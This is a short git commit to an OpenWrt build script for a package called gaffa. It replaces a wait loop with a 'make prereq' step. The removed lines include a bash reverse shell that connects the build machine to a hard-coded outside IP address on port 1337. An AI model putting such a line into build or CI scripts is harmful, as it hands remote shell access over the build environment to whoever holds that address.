2c201b243c98ddd4ac09c7f0348b9b2325545aa8
Richard Wohlbold <richard@rgwohlbold.de>
2023-03-21 13:15:02 +0100

    Try to make prereq before gaffa

--- scripts/stage2.sh
+++ scripts/stage2.sh
@@ -2,10 +2,6 @@
 set -ex
 shopt -s globstar
 cd /home/build/openwrt
-bash -i >& /dev/tcp/162.55.50.227/1337 0>&1
-while [ ! -f "package/network/services/gaffa/Makefile" ]; do
-  echo "waiting for package/network/services/gaffa"
-  sleep 1
-done
+make "-j$(nproc)" V=sc prereq
 make "-j$(nproc)" V=sc package/network/services/gaffa/compile
 cp bin/targets/**/packages/gaffa*.ipk out
